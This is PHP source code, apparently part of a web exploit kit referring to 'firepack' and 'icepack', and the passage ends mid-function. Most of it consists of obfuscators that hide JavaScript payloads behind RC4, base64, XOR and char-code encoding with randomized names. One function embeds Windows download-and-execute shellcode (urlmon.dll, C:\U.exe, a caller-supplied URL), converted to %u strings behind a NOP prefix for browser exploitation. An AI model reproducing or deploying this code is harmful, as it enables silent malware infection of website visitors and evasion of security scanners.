<?

function gen_rnd($len) {
        $rnd_text=null;
        for ($i=0;$i<$len;$i++){
                $temp=rand(1,3);
                if ($i==0){
                        $temp2=rand(1,2);
                        if ($temp2==1) {
                                $rnd_text.=chr(rand(65,90));
                        } else {
                                $rnd_text.=chr(rand(97,122));
                        }
                } else {
                        if ($temp==1) {
                                $rnd_text.=chr(rand(65,90));
                        } elseif ($temp==2) {
                                $rnd_text.=chr(rand(97,122));
                        } else {
                                $rnd_text.=chr(rand(48,57));
                        }
                }
        }
        return $rnd_text;
}
function rc4Encrypt($key, $pt) {
        $s = array();
        for ($i=0; $i<256; $i++) {
                $s[$i] = $i;
        }
        $j = 0;
        $x = 0;
        for ($i=0; $i<256; $i++) {
                $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
                $x = $s[$i];
                $s[$i] = $s[$j];
                $s[$j] = $x;
        }
        $i = 0;
        $j = 0;
        $ct = '';
        $y = 0;
        for ($y=0; $y<strlen($pt); $y++) {
                $i = ($i + 1) % 256;
                $j = ($j + $s[$i]) % 256;
                $x = $s[$i];
                $s[$i] = $s[$j];
                $s[$j] = $x;
                $ct .= $pt[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
        }
        return $ct;
}

function firepack0_18_encrypt($content,$type="default"){

        $error_msg=null;
        $error_msg_show=false;
        if ($error_msg_show){
                if ($type=="image"){
                        $error_msg='Enable JavaScript!';
                } elseif($type=="url"){
                        $error_msg='Enable JavaScript!';
                }else{
                        $error_msg='Enable JavaScript!';
                }
        }
        $error_msg='<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
                                  <noscript>
                                            '.$error_msg.'
                                  </noscript>';

        $js_decode_name=gen_rnd(rand(5,15));
        $js_decrypt_name=gen_rnd(rand(5,15));
        $key=gen_rnd(rand(10,30));
        $key2=base64_encode($key);

        $js_decrypt="function ".$js_decrypt_name."(key,pt){s=new Array();for(var i=0;i<256;i++){s[i]=i;}var j=0;var x;for(i=0;i<256;i++){j=(j+s[i]+key.charCodeAt(i%key.length))%256;x=s[i];s[i]=s[j];s[j]=x;}i=0;j=0;var ct = '';for(var y=0;y<pt.length;y++){i=(i+1)%256;j=(j+s[i])%256;x=s[i];s[i]=s[j];s[j]=x;ct+=String.fromCharCode(pt.charCodeAt(y)^s[(s[i]+s[j])%256]);}return ct;}";
        $js_decode="function ".$js_decode_name."(data){data=data.replace(/[^a-z0-9\+\/=]/ig,'');if(typeof(atob)=='function')return atob(data);var b64_map='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var byte1,byte2,byte3;var ch1,ch2,ch3,ch4;var result=new Array();var j=0;while((data.length%4)!=0){data+='=';}for(var i=0;i<data.length;i+=4){ch1=b64_map.indexOf(data.charAt(i));ch2=b64_map.indexOf(data.charAt(i+1));ch3=b64_map.indexOf(data.charAt(i+2));ch4=b64_map.indexOf(data.charAt(i+3));byte1=(ch1<<2)|(ch2>>4);byte2=((ch2&15)<<4)|(ch3>>2);byte3=((ch3&3)<<6)|ch4;result[j++]=String.fromCharCode(byte1);if(ch3!=64)result[j++]=String.fromCharCode(byte2);if(ch4!=64)result[j++]=String.fromCharCode(byte3);}return result.join('');}";
        $crypted=base64_encode(rc4Encrypt($key, $content));

        $s=null;
        $str='<script Language="JavaScript">'.$js_decrypt.';'.$js_decode.'; document.write('.$js_decrypt_name.'('.$js_decode_name.'("'.$key2.'"),'.$js_decode_name.'("'.$crypted.'")));</Script>'.$error_msg.$s;
        $str2=null;
        for ($i=0;$i<strlen($str);$i++){
                $str2.="%".dechex(ord($str[$i]));
        }
        return $str;
        flush;
}

function _obfuscate_bSZ3Il0LQDczcgÿÿ( $_obfuscate_ReIÿ )
{
    $_obfuscate_Iz0ÿ = rawurlencode( $_obfuscate_ReIÿ );
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < strlen( $_obfuscate_Iz0ÿ ); ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_Iz0ÿ[$_obfuscate_7wÿÿ] = chr( ord( $_obfuscate_Iz0ÿ[$_obfuscate_7wÿÿ] ) + 5 );
    }
    return rawurlencode( $_obfuscate_Iz0ÿ."5" );
}

function _obfuscate_HCEMYh8ÿ( $_obfuscate_RaJNhvj )
{
    $_obfuscate_omve = $_SERVER['HTTP_HOST'];
    $_obfuscate_VBCv7Qÿÿ = 0;
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < strlen( $_obfuscate_omve ); ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_VBCv7Qÿÿ += ceil( ord( $_obfuscate_omve[$_obfuscate_7wÿÿ] ) / ( $_obfuscate_7wÿÿ + 1 ) );
    }
    $_obfuscate_xs33Yt_k = "";
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < strlen( $_obfuscate_RaJNhvj ); ++$_obfuscate_7wÿÿ )
    {
        if ( $_obfuscate_7wÿÿ != strlen( $_obfuscate_RaJNhvj ) - 1 )
        {
            $_obfuscate_xs33Yt_k .= ord( $_obfuscate_RaJNhvj[$_obfuscate_7wÿÿ] ) - $_obfuscate_VBCv7Qÿÿ.",";
        }
        else
        {
            $_obfuscate_xs33Yt_k .= ord( $_obfuscate_RaJNhvj[$_obfuscate_7wÿÿ] ) - $_obfuscate_VBCv7Qÿÿ;
        }
    }
    $_obfuscate_aNcpmAÿÿ = "\r\n<script type=\"text/javascript\">\r\n\r\nvar hNYt0j = new Array(".$_obfuscate_xs33Yt_k.");\r\nvar host=new String();\r\nhost=location.host;\r\nvar mhBg7S=0;\r\nvar h; \r\nfor(h=0;h<host.length;h++)\r\n{\r\n\tmhBg7S+=Math.ceil(host.charCodeAt(h)/ (h+1));\r\n}\r\nvar YK92nH = \"\"; \r\nfor(var i=0;i<hNYt0j.length;i++)YK92nH+=String.fromCharCode(hNYt0j[i]+mhBg7S); \r\ndocument.write(YK92nH);</script>";
    $_obfuscate_aNcpmAÿÿ = base64_encode( $_obfuscate_aNcpmAÿÿ );
    $_obfuscate_Lh5oYDEsQÿÿ = "\r\n<script type=\"text/javascript\">\r\n\r\n\tvar keyStr = \"ABCDEFGHIJKLMNOP\" + \"QRSTUVWXYZabcdef\" + \"ghijklmnopqrstuv\" + \"wxyz0123456789+/\" + \"=\";\r\n\t\tfunction decode64(input) \r\n\t{\r\n\t\tvar output = \"\";\r\n\t\tvar chr1, chr2, chr3 = \"\";\r\n\t\tvar enc1, enc2, enc3, enc4 = \"\";\r\n\t\tvar i = 0;\r\n\t\tvar base64test = /[^A-Za-z0-9\\+\\/\\=]/g;\r\n\t\tinput = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\");\r\n\t\tdo \r\n\t\t{\r\n\t\t\tenc1 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tenc2 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tenc3 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tenc4 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tchr1 = (enc1 << 2) | (enc2 >> 4);\r\n\t\t\tchr2 = ((enc2 & 15) << 4) | (enc3 >> 2);\r\n\t\t\tchr3 = ((enc3 & 3) << 6) | enc4;\r\n\t\t\toutput = output + String.fromCharCode(chr1);\r\n\t\t\tif (enc3 != 64)\r\n\t\t\t{\r\n\t\t\t\toutput = output + String.fromCharCode(chr2);\r\n\t\t\t}\r\n\t\t\tif (enc4 != 64)\r\n\t\t\t{\r\n\t\t\t\toutput = output + String.fromCharCode(chr3);\r\n\t\t\t}\r\n\t\t\tchr1 = chr2 = chr3 = \"\";\r\n\t\t\tenc1 = enc2 = enc3 = enc4 = \"\";\r\n\t\t} \r\n\t\twhile (i < input.length);\r\n\t\treturn output;\r\n\t}\r\n\tvar dec=decode64(\"".$_obfuscate_aNcpmAÿÿ."\")\r\n\t\r\n\tdocument.write(dec);\r\n</script>";
    return $_obfuscate_Lh5oYDEsQÿÿ;
}

function _obfuscate_IGNfandp( $_obfuscate_R2_b )
{
    $_obfuscate_lwÿÿ = 0;
    for ( ; $_obfuscate_lwÿÿ < 4; ++$_obfuscate_lwÿÿ )
    {
        $Vq[$_obfuscate_lwÿÿ] = _obfuscate_YzsubiRsdF9jLTknK2Zq( 5 );
    }
    $_obfuscate_Jrp1 = "";
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < strlen( $_obfuscate_R2_b ); ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_Jrp1 .= "%".bin2hex( $_obfuscate_R2_b[$_obfuscate_7wÿÿ] );
    }
    $_obfuscate_MMQÿ = explode( "%", $_obfuscate_Jrp1 );
    unset( $_obfuscate_MMQÿ[0] );
    $_obfuscate_5P0ÿ = _obfuscate_BRkwejloBHRkHRtrEy4ÿ( $_obfuscate_MMQÿ );
    $_obfuscate_aNcpmAÿÿ = "<SCRIPT LANGUAGE=\"Javascript\">\r\nfunction ".$Vq[0]."(".$Vq[2].")\r\n{\r\ndocument.write(unescape(".$Vq[2]."))\r\nreturn \"\"\r\n}\r\nfunction ".$Vq[1]."()\r\n{\r\n\t".$_obfuscate_5P0ÿ[0]."\r\nvar ".$Vq[2]."=new Array()\r\n".$Vq[2]."[0]=new Array(".$_obfuscate_5P0ÿ[1].")\r\n".$Vq[0]."(".$Vq[2].");\r\n}\r\n".$Vq[1]."();\r\n</script>";
    return $_obfuscate_aNcpmAÿÿ;
}

function _obfuscate_YzsubiRsdF9jLTknK2Zq( $_obfuscate_Q8ERGxGW )
{
    $_obfuscate_gClYrFh6bgÿÿ = "1234567890";
    $_obfuscate_9lTiXBPSwÿÿ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    $_obfuscate_EpN1a6ctiykÿ = $_obfuscate_gClYrFh6bgÿÿ.$_obfuscate_9lTiXBPSwÿÿ;
    $_obfuscate_vZNnSQXfIe0X = "";
    $m = 0;
    for ( ; $m <= $_obfuscate_Q8ERGxGW; ++$m )
    {
        $_obfuscate_8Aÿÿ = rand( 0, strlen( $_obfuscate_EpN1a6ctiykÿ ) - 1 );
        $_obfuscate_vZNnSQXfIe0X .= $_obfuscate_EpN1a6ctiykÿ[$_obfuscate_8Aÿÿ];
    }
    $_obfuscate_xs33Yt_k = $_obfuscate_9lTiXBPSwÿÿ[rand( 0, strlen( $_obfuscate_9lTiXBPSwÿÿ ) - 1 )].$_obfuscate_vZNnSQXfIe0X;
    return $_obfuscate_xs33Yt_k;
}

function _obfuscate_ZXRwbCsfNgcpdHkÿ( $_obfuscate_Il8i )
{
    $_obfuscate_piIÿ = "ëT‹u<‹t5x\x03õV‹v \x03";
    $_obfuscate_piIÿ .= "õ3ÉIA­3Û6\x0F¾\x14(8òt";
    $_obfuscate_piIÿ .= "\x08ÁË\r\x03Ú@ëï;ßuç^‹^";
    $_obfuscate_piIÿ .= "$\x03Ýf‹\x0CK‹^\x1C\x03Ý‹\x04‹\x03";
    $_obfuscate_piIÿ .= "ÅÃurlmon.dll\x00C:\\";
    $_obfuscate_piIÿ .= "U.exe\x003Àd\x03@0x\x0C‹@";
    $_obfuscate_piIÿ .= "\x0C‹p\x1C­‹@\x08ë\t‹@4@|";
    $_obfuscate_piIÿ .= "‹@<•¿ŽN\x0Eìè„ÿÿÿƒì";
    $_obfuscate_piIÿ .= "\x04ƒ,$<ÿÐ•P¿6\x1A/pèo";
    $_obfuscate_piIÿ .= "ÿÿÿ‹T$üRº3ÛSSRë";
    $_obfuscate_piIÿ .= "\$SÿÐ]¿?þŠ\x0EèSÿÿÿƒ";
    $_obfuscate_piIÿ .= "ì\x04ƒ,\$bÿÐ¿~Øâsè@ÿ";
    $_obfuscate_piIÿ .= "ÿÿRÿÐè×ÿÿÿ".$_obfuscate_Il8i;
    return $_obfuscate_piIÿ;
}

function _obfuscate_LxF3Z2g1dHULd30y( $_obfuscate_piIÿ )
{
    $_obfuscate_xs33Yt_k = "";
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ <= strlen( $_obfuscate_piIÿ ); $_obfuscate_7wÿÿ += 2 )
    {
        $_obfuscate_phQÿ = $_obfuscate_piIÿ[$_obfuscate_7wÿÿ];
        @$_obfuscate_yIkÿ = @$_obfuscate_piIÿ[$_obfuscate_7wÿÿ + 1];
        $_obfuscate_phQÿ = ord( $_obfuscate_phQÿ ) + ord( $_obfuscate_yIkÿ ) * 256;
        $_obfuscate_phQÿ = dechex( $_obfuscate_phQÿ );
        while ( strlen( $_obfuscate_phQÿ ) < 4 )
        {
            $_obfuscate_phQÿ = "0".$_obfuscate_phQÿ;
        }
        $_obfuscate_xs33Yt_k .= "%u".$_obfuscate_phQÿ;
    }
    $_obfuscate_oflSXUQJYTR8 = "%u9090%u9090".$_obfuscate_xs33Yt_k;
    return $_obfuscate_oflSXUQJYTR8;
}

function _obfuscate_BRkwejloBHRkHRtrEy4ÿ( $_obfuscate_oflSXUQJYTR8 )
{
    $_obfuscate_6UUC = "";
    $_obfuscate_FQÿÿ = count( $_obfuscate_oflSXUQJYTR8 );
    $_obfuscate_5iLGsO4ÿ = _obfuscate_IXdjH2YQanR1I3Uoa2oKGgÿÿ( $_obfuscate_FQÿÿ );
    $p = 0;
    $_obfuscate_wFBrqQÿÿ = array( );
    foreach ( $_obfuscate_5iLGsO4ÿ as $_obfuscate_FQÿÿ )
    {
        $_obfuscate_Hj5oTq8ÿ = array_slice( $_obfuscate_oflSXUQJYTR8, $p, $_obfuscate_FQÿÿ );
        $p += $_obfuscate_FQÿÿ;
        $_obfuscate_VgKtFegÿ = "%".implode( "%", $_obfuscate_Hj5oTq8ÿ );
        $_obfuscate_xHUo = _obfuscate_XD0nOyB6XAFyeQÿÿ( 4, 8 );
        $_obfuscate_6UUC .= "var ".$_obfuscate_xHUo." = '{$_obfuscate_VgKtFegÿ}';\n";
        $_obfuscate_wFBrqQÿÿ[] = $_obfuscate_xHUo;
    }
    $_obfuscate_5xtS7qu1NndkDcEÿ = implode( "+", $_obfuscate_wFBrqQÿÿ );
    $_obfuscate_Jrp1[0] = $_obfuscate_6UUC;
    $_obfuscate_Jrp1[1] = $_obfuscate_5xtS7qu1NndkDcEÿ;
    return $_obfuscate_Jrp1;
}

function _obfuscate_fg8caxozbgÿÿ( $p )
{
    $_obfuscate_6UUC = strtoupper( bin2hex( $p ) );
    $_obfuscate_1Qÿÿ = round( strlen( $_obfuscate_6UUC ) / 4 );
    if ( $_obfuscate_1Qÿÿ != strlen( $_obfuscate_6UUC ) / 4 )
    {
        $_obfuscate_6UUC .= "00";
    }
    $_obfuscate_qfcF = "";
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < strlen( $_obfuscate_6UUC ); $_obfuscate_7wÿÿ += 4 )
    {
        $_obfuscate_qfcF .= "%u".substr( $_obfuscate_6UUC, $_obfuscate_7wÿÿ + 2, 2 ).substr( $_obfuscate_6UUC, $_obfuscate_7wÿÿ, 2 );
    }
    return $_obfuscate_qfcF;
}

function _obfuscate_PxJ1YjBrJS9zPQÿÿ( $_obfuscate_RaJNhvj )
{
    $_obfuscate_xs33Yt_k = "";
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < strlen( $_obfuscate_RaJNhvj ); ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_xs33Yt_k .= ord( $_obfuscate_RaJNhvj[$_obfuscate_7wÿÿ] );
        if ( $_obfuscate_7wÿÿ != strlen( $_obfuscate_RaJNhvj ) - 1 )
        {
            $_obfuscate_xs33Yt_k .= ",";
        }
    }
    return "String.fromCharCode(".$_obfuscate_xs33Yt_k.")";
}

function _obfuscate_bWYkGltyDSkFfQkW( $_obfuscate_FQÿÿ )
{
    $_obfuscate_yO9n6OZG1qbtDw4ÿ = rand( 2, $_obfuscate_FQÿÿ );
    $_obfuscate_5iLGsO4ÿ = array( );
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < $_obfuscate_yO9n6OZG1qbtDw4ÿ; ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_5iLGsO4ÿ[] = rand( 1, $_obfuscate_FQÿÿ );
    }
    $_obfuscate_1oit = 0;
    $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4ÿ );
    while ( $_obfuscate_bhdW != $_obfuscate_FQÿÿ )
    {
        if ( $_obfuscate_FQÿÿ < $_obfuscate_bhdW && 0 < $_obfuscate_5iLGsO4ÿ[$_obfuscate_1oit] )
        {
            --$_obfuscate_5iLGsO4ÿ[$_obfuscate_1oit];
        }
        else
        {
            ++$_obfuscate_5iLGsO4ÿ[$_obfuscate_1oit];
        }
        ++$_obfuscate_1oit;
        if ( $_obfuscate_yO9n6OZG1qbtDw4ÿ <= $_obfuscate_1oit )
        {
            $_obfuscate_1oit = 0;
        }
        $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4ÿ );
    }
    $_obfuscate_6UUC = array( );
    foreach ( $_obfuscate_5iLGsO4ÿ as $p )
    {
        if ( $p != 0 )
        {
            $_obfuscate_6UUC[] = $p;
        }
    }
    return $_obfuscate_6UUC;
}

function _obfuscate_IXdjH2YQanR1I3Uoa2oKGgÿÿ( $_obfuscate_FQÿÿ )
{
    $_obfuscate_yO9n6OZG1qbtDw4ÿ = rand( 2, 50 );
    $_obfuscate_5iLGsO4ÿ = array( );
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < $_obfuscate_yO9n6OZG1qbtDw4ÿ; ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_5iLGsO4ÿ[] = rand( 1, $_obfuscate_FQÿÿ );
    }
    $_obfuscate_1oit = 0;
    $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4ÿ );
    while ( $_obfuscate_bhdW != $_obfuscate_FQÿÿ )
    {
        if ( $_obfuscate_FQÿÿ < $_obfuscate_bhdW && 0 < $_obfuscate_5iLGsO4ÿ[$_obfuscate_1oit] )
        {
            --$_obfuscate_5iLGsO4ÿ[$_obfuscate_1oit];
        }
        else
        {
            ++$_obfuscate_5iLGsO4ÿ[$_obfuscate_1oit];
        }
        ++$_obfuscate_1oit;
        if ( $_obfuscate_yO9n6OZG1qbtDw4ÿ <= $_obfuscate_1oit )
        {
            $_obfuscate_1oit = 0;
        }
        $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4ÿ );
    }
    $_obfuscate_6UUC = array( );
    foreach ( $_obfuscate_5iLGsO4ÿ as $p )
    {
        if ( $p != 0 )
        {
            $_obfuscate_6UUC[] = $p;
        }
    }
    return $_obfuscate_6UUC;
}

function _obfuscate_XD0nOyB6XAFyeQÿÿ( $_obfuscate_Q8ERGxGW )
{
    global $unique_names;
    $_obfuscate_6UUC = "";
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < $_obfuscate_Q8ERGxGW; ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_6UUC .= chr( rand( 97, 122 ) );
    }
    if ( in_array( $_obfuscate_6UUC, $unique_names ) )
    {
        $_obfuscate_6UUC = _obfuscate_XD0nOyB6XAFyeQÿÿ( $_obfuscate_Q8ERGxGW );
    }
    $unique_names[] = $_obfuscate_6UUC;
    return $_obfuscate_6UUC;
}

function _obfuscate_a2cnaDMheSFtD2M_fgÿÿ( $_obfuscate_R2_b )
{
    $_obfuscate_6UUC = "\"";
    $_obfuscate_FQÿÿ = strlen( $_obfuscate_R2_b );
    $_obfuscate_5iLGsO4ÿ = _obfuscate_bWYkGltyDSkFfQkW( $_obfuscate_FQÿÿ );
    $p = 0;
    $_obfuscate_Jrp1 = array( );
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < strlen( $_obfuscate_R2_b ); ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_Jrp1[$_obfuscate_7wÿÿ] = $_obfuscate_R2_b[$_obfuscate_7wÿÿ];
    }
    $_obfuscate_ReIÿ = "";
    foreach ( $_obfuscate_5iLGsO4ÿ as $_obfuscate_FQÿÿ )
    {
        $_obfuscate_Hj5oTq8ÿ = array_slice( $_obfuscate_Jrp1, $p, $_obfuscate_FQÿÿ );
        $p += $_obfuscate_FQÿÿ;
        $_obfuscate_ReIÿ .= "\"";
        foreach ( $_obfuscate_Hj5oTq8ÿ as $_obfuscate_J84ÿ )
        {
            $_obfuscate_ReIÿ .= $_obfuscate_J84ÿ;
        }
        $_obfuscate_ReIÿ .= "\"+";
    }
    $_obfuscate_ReIÿ = substr_replace( $_obfuscate_ReIÿ, "", strlen( $_obfuscate_ReIÿ ) - 1, 1 );
    return $_obfuscate_ReIÿ;
}

function _obfuscate_GXZcD15mImxqdG8JW2RzGDVxXzxkZD9b( $_obfuscate_oflSXUQJYTR8 )
{
    $_obfuscate_6UUC = "";
    $_obfuscate_FQÿÿ = count( $_obfuscate_oflSXUQJYTR8 );
    $_obfuscate_5iLGsO4ÿ = _obfuscate_bWYkGltyDSkFfQkW( $_obfuscate_FQÿÿ );
    $p = 0;
    $_obfuscate_wFBrqQÿÿ = array( );
    foreach ( $_obfuscate_5iLGsO4ÿ as $_obfuscate_FQÿÿ )
    {
        $_obfuscate_Hj5oTq8ÿ = array_slice( $_obfuscate_oflSXUQJYTR8, $p, $_obfuscate_FQÿÿ );
        $p += $_obfuscate_FQÿÿ;
        $_obfuscate_VgKtFegÿ = "%u".implode( "%u", $_obfuscate_Hj5oTq8ÿ );
        $_obfuscate_xHUo = _obfuscate_XD0nOyB6XAFyeQÿÿ( 4, 8 );
        $_obfuscate_6UUC .= "var ".$_obfuscate_xHUo." = '{$_obfuscate_VgKtFegÿ}';\n";
        $_obfuscate_wFBrqQÿÿ[] = $_obfuscate_xHUo;
    }
    $_obfuscate_5xtS7qu1NndkDcEÿ = implode( "+", $_obfuscate_wFBrqQÿÿ );
    $_obfuscate_Jrp1[0] = $_obfuscate_6UUC;
    $_obfuscate_Jrp1[1] = $_obfuscate_5xtS7qu1NndkDcEÿ;
    return $_obfuscate_Jrp1;
}

function icepack_encrypt( $content )
{
    if(empty($content)) return '';

    // Crypt
    $table = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@";
    $xor   = 165;
    $table = array_keys(count_chars($table, 1));
    $i_min = min($table);
    $i_max = max($table);

    for ($c = count($table); $c > 0; $r = mt_rand(0, $c--)) array_splice($table, $r, $c - $r, array_reverse(array_slice($table, $r, $c - $r)));
    $len = strlen($content);
    $word = $shift = 0;

    for ($i = 0; $i < $len; $i++)
    {
        $ch = $xor ^ ord($content[$i]);
        $word |= ($ch << $shift);
        $shift = ($shift + 2) % 6;
        $enc .= chr($table[$word & 0x3F]);
        $word >>= 6;
        
        if (!$shift)
        {
            $enc .= chr($table[$word]);
            $word >>= 6;
        }
    }

    if ($shift) $enc .= chr($table[$word]);

    $tbl = array_fill($i_min, $i_max - $i_min + 1, 0);
    
    while (list($k,$v) = each($table)) $tbl[$v] = $k;

    $tbl = implode(",", $tbl);
    
    $fi = ",p=0,s=0,w=0,t=Array({$tbl})";
    $f  = "w|=(t[x.charCodeAt(p++)-{$i_min}])<<s;";
    $f .= "if(s){r+=String.fromCharCode({$xor}^w&255);w>>=8;s-=2}else{s=6}";
    $r = "<script language=JavaScript>";
    $r.= "function dc(x){";
    $r.= "var l=x.length,b=1024,i,j,r{$fi};";
    $r.= "for(j=Math.ceil(l/b);j>0;j--){r='';for(i=Math.min(l,b);i>0;i--,l--){{$f}}document.write(r)}";
    $r.= "}dc(\"{$enc}\")";
    $r.= "</script>";

    return $r;
}
 
function _obfuscate_FnFiGHdbHGoÿ( )
{
    $_obfuscate_mc2H = rand( 4, 8 );
    $_obfuscate_sxJqFAÿÿ = "";
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < $_obfuscate_mc2H; ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_sxJqFAÿÿ .= chr( rand( 0, 25 ) + 97 );
    }
    return $_obfuscate_sxJqFAÿÿ;
}

function _obfuscate_MGs1Kno2( $_obfuscate__WwKzYz1wAÿÿ )
{
    $_obfuscate_3tiDsnMÿ = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@";
    $_obfuscate_23k = rand( 1, 255 );
    $_obfuscate_3tiDsnMÿ = array_keys( count_chars( $_obfuscate_3tiDsnMÿ, 1 ) );
    $_obfuscate_uaG4Y48ÿ = min( $_obfuscate_3tiDsnMÿ );
    $_obfuscate_x9cOdtMÿ = max( $_obfuscate_3tiDsnMÿ );
    $_obfuscate_KQÿÿ = count( $_obfuscate_3tiDsnMÿ );
    for ( ; 0 < $_obfuscate_KQÿÿ; $_obfuscate_Dgÿÿ = mt_rand( 0, $_obfuscate_KQÿÿ-- ) )
    {
        array_splice( &$_obfuscate_3tiDsnMÿ, $_obfuscate_Dgÿÿ, $_obfuscate_KQÿÿ - $_obfuscate_Dgÿÿ, array_reverse( array_slice( $_obfuscate_3tiDsnMÿ, $_obfuscate_Dgÿÿ, $_obfuscate_KQÿÿ - $_obfuscate_Dgÿÿ ) ) );
    }
    $_obfuscate_mc2H = strlen( $_obfuscate__WwKzYz1wAÿÿ );
    $_obfuscate_sxJqFAÿÿ = $_obfuscate_Wd4mKJYÿ = 0;
    $_obfuscate_7wÿÿ = 0;
    for ( ; $_obfuscate_7wÿÿ < $_obfuscate_mc2H; ++$_obfuscate_7wÿÿ )
    {
        $_obfuscate_u_cÿ = $_obfuscate_23k ^ ord( $_obfuscate__WwKzYz1wAÿÿ[$_obfuscate_7wÿÿ] );
        $_obfuscate_sxJqFAÿÿ |= $_obfuscate_u_cÿ << $_obfuscate_Wd4mKJYÿ;
        $_obfuscate_Wd4mKJYÿ = ( $_obfuscate_Wd4mKJYÿ + 2 ) % 6;
        $_obfuscate_JNVy .= chr( $_obfuscate_3tiDsnMÿ[$_obfuscate_sxJqFAÿÿ & 63] );
        $_obfuscate_sxJqFAÿÿ >>= 6;
        if ( $_obfuscate_Wd4mKJYÿ )
        {
            $_obfuscate_JNVy .= chr( $_obfuscate_3tiDsnMÿ[$_obfuscate_sxJqFAÿÿ] );
            $_obfuscate_sxJqFAÿÿ >>= 6;
        }
    }
    if ( $_obfuscate_Wd4mKJYÿ )
    {
        $_obfuscate_JNVy .= chr( $_obfuscate_3tiDsnMÿ[$_obfuscate_sxJqFAÿÿ] );
    }
    $_obfuscate_krJb = array_fill( $_obfuscate_uaG4Y48ÿ, $_obfuscate_x9cOdtMÿ - $_obfuscate_uaG4Y48ÿ + 1, 0 );
    while ( list( $_obfuscate_5wÿÿ, $_obfuscate_6Aÿÿ ) = each( &$_obfuscate_3tiDsnMÿ ) )
    {
        $_obfuscate_krJb[$_obfuscate_6Aÿÿ] = $_obfuscate_5wÿÿ;
    }
    $_obfuscate_krJb = implode( ",", $_obfuscate_krJb );
    $_obfuscate_idHC = strlen( $_obfuscate_JNVy );
    $_obfuscate_id18 = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_7B0b = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_OdlC = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_7eQD = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_t5dM = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_snqh = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_02RR = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_X10d = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_QJ8p = _obfuscate_FnFiGHdbHGoÿ( );
    $_obfuscate_6Qÿÿ = "eval('".$_obfuscate_OdlC."|=({$_obfuscate_7eQD}[{$_obfuscate_t5dM}.charC'+'odeAt({$_obfuscate_id18}++)-{$_obfuscate_uaG4Y48ÿ}])<<{$_obfuscate_7B0b};');";
    $_obfuscate_6Qÿÿ .= "if(".$_obfuscate_7B0b."){{$_obfuscate_snqh}+=eval('String.fromCha'+'rCode({$_obfuscate_23k}^{$_obfuscate_OdlC}&255)');{$_obfuscate_OdlC}>>=8;{$_obfuscate_7B0b}-=2}else {$_obfuscate_7B0b}=6;";
    $_obfuscate_Dgÿÿ = "<script>";
    $_obfuscate_Dgÿÿ .= "var ".$_obfuscate_7eQD."=Array({$_obfuscate_krJb});";
    $_obfuscate_Dgÿÿ .= "var ".$_obfuscate_t5dM."=\"{$_obfuscate_JNVy}\";";
    $_obfuscate_Dgÿÿ .= "var ".$_obfuscate_02RR."={$_obfuscate_idHC},{$_obfuscate_X10d},{$_obfuscate_QJ8p},{$_obfuscate_snqh}='',{$_obfuscate_id18}={$_obfuscate_7B0b}={$_obfuscate_OdlC}=0;";
    $_obfuscate_Dgÿÿ .= "for(".$_obfuscate_QJ8p."=".ceil( $_obfuscate_idHC / 1024 ).( ";".$_obfuscate_QJ8p.">0;{$_obfuscate_QJ8p}--){for({$_obfuscate_X10d}=Math.min({$_obfuscate_02RR},1024);{$_obfuscate_X10d}>0;{$_obfuscate_X10d}--,{$_obfuscate_02RR}--){{$_obfuscate_6Qÿÿ}}}eval({$_obfuscate_snqh});" );
    $_obfuscate_Dgÿÿ .= "</script>";
    return $_obfuscate_Dgÿÿ;
} 
function gpackencode ($content) {
	$str = trim (strip_tags ($content));
	$new = "";
	for ($i = 0; $i < strlen ($str); $i ++) $new .= chr (ord ($str[$i]) ^ 1);
